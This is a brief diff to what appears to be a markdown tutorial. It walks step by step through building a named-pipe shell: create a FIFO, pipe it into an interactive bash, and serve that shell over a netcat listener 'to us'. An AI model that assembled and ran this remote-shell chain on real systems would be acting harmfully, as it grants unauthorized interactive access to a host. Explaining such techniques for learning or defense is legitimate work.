@@ -50,8 +50,15 @@ rm -f /tmp/f
 ```bash
 mkfifo /tmp/f
 ```
-3. Read from the pipe
+3. Read from the pipe 
 ```bash
-cat /tmp/f
+cat /tmp/f |
 ```
-4. 
+4. and pipe to shell 
+```bash
+/bin/bash -i 2>&1 |
+```
+5. give back the shell to us through netcat
+```bash
+nc -l 
+```
